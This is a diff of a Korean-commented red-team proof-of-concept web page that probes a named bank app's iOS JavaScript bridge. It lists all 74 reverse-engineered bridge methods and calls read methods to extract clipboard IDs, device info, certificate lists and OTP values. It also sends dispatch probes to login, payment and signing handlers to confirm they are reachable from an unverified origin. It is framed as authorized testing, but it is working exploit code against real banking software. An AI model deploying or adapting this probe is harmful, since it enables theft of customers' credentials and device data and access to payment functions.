@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>REDTEAM PoC — Bridge Reachability (자사 앱 테스트 전용)</title>
+<title>REDTEAM PoC — Bridge Reachability (대상 앱 테스트 전용)</title>
 <style>
   body{font-family:-apple-system,system-ui,sans-serif;margin:0;padding:16px;background:#0b0b0d;color:#e6e6e6}
   h1{font-size:17px;color:#ff5c5c}
@@ -15,8 +15,8 @@
 <body>
 <h1>⚠️ REDTEAM PoC — Bridge Reachability</h1>
 <div class="warn">
-  승인된 <b>테스트 전용</b>. 이 페이지는 <b>브릿지에 도달 가능한지와 데이터가 반환되는지</b>만 확인한다.
-  <b>실제 결제·서명은 실행하지 않는다</b>(민감 함수는 존재 여부만 열거).
+  승인된 <b>대상 앱 테스트 전용</b>. READ 메서드로 <b>값 반환 가능 여부</b>만 확인한다.
+  결제·서명 메서드는 <b>존재 열거만</b> 하고 실행하지 않는다. 외부 배포·실사용자 대상 사용 금지.
 </div>
 <div id="log"></div>
 
@@ -24,13 +24,35 @@
 const L=(s,c)=>{const d=document.getElementById('log');d.innerHTML+=(c?`<span class="${c}">${s}</span>`:s)+"\n";};
 L("오리진: "+location.href,"muted");L("—".repeat(46));
 
-// 역분석으로 확정된 kbank JS브리지 메서드 (74개 중 핵심)
-const READ=["callKbankGetSetting","callGetSetting","callGetClipboardId","callPhoneInfo",
-  "callExistAutoLoginUuid","callMpkiGetAllInfo","callCertList","callSimpleCertList",
-  "callGetPushSettings","callGetSteps","callPageFinished"];
+// 역분석으로 확정된 대상 앱 JS브리지 메서드 74개 전체
+// 노출 위치: Projects/Feature/Channel/Implement/JavaScriptService/call*.swift
+//           디스패처: ChannelWebBridgeCommand.swift
+const ALL=["callAppIronAuth","callArsPhone","callCertConfirmArray","callCertDelete","callCertList",
+"callCertPdfSign","callCertUbikey","callCommonCertUpdate","callContactMulti","callCreateAutoLoginUuid",
+"callCreateUuid","callDeleteAutoLoginUuid","callDeviceHaptic","callExistAutoLoginUuid","callEzl",
+"callGetClipboardId","callGetPushSettings","callGetSetting","callGetSteps","callIsCalling",
+"callIsDeviceLock","callIsVoiceOver","callKbankGetSetting","callKbankHaptic","callKbankSetSetting",
+"callKeypad","callLogin","callMPKISignWithAttr","callMobileIDApp","callMotpCheckPw","callMotpDelete",
+"callMotpExist","callMotpKeyChange","callMotpKeyChangePw","callMotpNumber","callMpkiBioCheck",
+"callMpkiBioRegComplete","callMpkiDiscard","callMpkiGetAllInfo","callMpkiGetBioSignature","callMpkiIssue",
+"callMpkiIssueSave","callMpkiSign","callNativeLogin","callNativeRestAPI","callNonLoginPay",
+"callNormalSaveFile","callOTACDeregister","callOTACGetRegistrationMessage","callOTACGetVerifyMessage",
+"callOTACRegister","callOpenBrowser","callPageFinished","callPhoneInfo","callPhotoGallery",
+"callRequestFdsCollectionServer","callSTT","callSaveFile","callSaveImage","callScrapingBig",
+"callScrapingMulti","callSetPushSettings","callSetSetting","callShowAppStoreRatingPopup",
+"callSimpleCertCheckPin","callSimpleCertDelete","callSimpleCertList","callSimpleCertPasswordChange",
+"callStartApp","callWebViewClose","callWebViewLoad","callWebViewOpen","callZeropayRsltReq","callZeropayTranReq"];
+// 값 반환(READ) — probe로 값 탈취 시도
+const READ=["callKbankGetSetting","callGetSetting","callGetClipboardId","callPhoneInfo","callExistAutoLoginUuid",
+"callMpkiGetAllInfo","callCertList","callSimpleCertList","callGetPushSettings","callGetSteps","callMotpExist",
+"callMotpNumber","callIsCalling","callIsDeviceLock","callIsVoiceOver","callCreateUuid","callCertConfirmArray",
+"callOTACGetRegistrationMessage","callOTACGetVerifyMessage","callArsPhone","callPageFinished"];
+// 민감 ACTION — 열거만(실행 안 함)
 const ACTION=["callLogin","callNativeLogin","callNonLoginPay","callZeropayTranReq","callZeropayRsltReq",
-  "callMpkiSign","callMPKISignWithAttr","callMpkiGetBioSignature","callCreateAutoLoginUuid",
-  "callDeleteAutoLoginUuid","callOTACRegister","callScrapingBig","callSaveFile","callStartApp"];
+"callMpkiSign","callMPKISignWithAttr","callMpkiGetBioSignature","callMpkiIssue","callMpkiIssueSave",
+"callCreateAutoLoginUuid","callDeleteAutoLoginUuid","callOTACRegister","callOTACDeregister",
+"callSimpleCertCheckPin","callSimpleCertPasswordChange","callMotpKeyChangePw","callSetSetting",
+"callAppIronAuth","callNativeRestAPI","callScrapingBig","callScrapingMulti","callSaveFile","callStartApp"];
 // 디스패처 핸들러명 후보 (단일핸들러+method 디스패치형일 때)
 const DISPATCHERS=["smartbank","kbank","Kbank","SmartBank","native","nativeBridge","KbankBridge",
   "JavaScriptService","kbankWebView","windowLoaded","iOS"];
@@ -61,13 +83,25 @@ READ.forEach(m=>{
 // 2) 노출된 핸들러 열거
 L("—".repeat(46));
 let names=[];try{names=Object.keys(mh);}catch(e){}
-[...READ,...ACTION,...DISPATCHERS].forEach(n=>{if(mh[n])names.push(n);});
+[...ALL,...DISPATCHERS].forEach(n=>{if(mh[n])names.push(n);});
 names=[...new Set(names)];
-L("노출된 브릿지 핸들러: "+(names.length?names.join(", "):"(열거 불가)"),names.length?"bad":"muted");
+L(`노출된 브릿지 핸들러 (전체 ${ALL.length}개 중 탐지): `+(names.length?names.join(", "):"(열거 불가)"),names.length?"bad":"muted");
 
-// 3) ACTION 메서드 — 도달 가능 여부만 (실행 안 함)
-L("—".repeat(46));L("[ACTION] 도달 가능성 (※ 실행 안 함):","muted");
-ACTION.forEach(m=>{const r=names.length>0||mh[m];L(`  ${m}: ${r?"도달 가능성 ⚠️":"미확인"}`,r?"bad":"muted");});
+// 3) ACTION — 도달 확증 probe: 무효 파라미터만 보내 '핸들러가 디스패치되는지'를 응답으로 확인.
+//    ※ 유효한 결제/서명 파라미터는 절대 안 보냄 → 실제 거래/서명 미발생.
+//    ※ 반드시 '확실히 격리된 샌드박스'에서만 실행할 것.
+L("—".repeat(46));
+L("[ACTION] 도달 확증 probe (무효 파라미터 — 실제 실행 아님):","muted");
+ACTION.forEach(m=>{
+  const ack="__ack_"+m.replace(/[^A-Za-z0-9]/g,"");
+  // 네이티브가 이 ack 콜백을 부르면 = 해당 메서드 핸들러가 실제로 디스패치됨 = 도달 확증
+  try{window[ack]=(...a)=>L(`  ${m}: 도달 확증 ✅ (응답=${String(a.join(",")).slice(0,60)})`,"bad");}catch(e){}
+  const probe={__probe:"reachability-only",callback:ack};   // 유효 거래값 없음 → 정상 핸들러면 거부
+  let sent=send(m,probe);
+  DISPATCHERS.forEach(d=>{sent=send(d,JSON.stringify({method:m,data:{__probe:"reachability-only"},callback:ack}))||sent;});
+  L(`  ${m}: ${sent?"probe 전송 → 응답 오면 도달 확증":(names.length?"도달 가능성(추론)":"핸들러 없음")}`,
+    sent?"muted":(names.length?"bad":"muted"));
+});
 
 L("—".repeat(46));
 L("판정: [응답]에 custid/uuid 뜨면 = 오리진검증 없음(#1 취약). 서버로그 히트 = 스킴 하이재킹 성립.","muted");
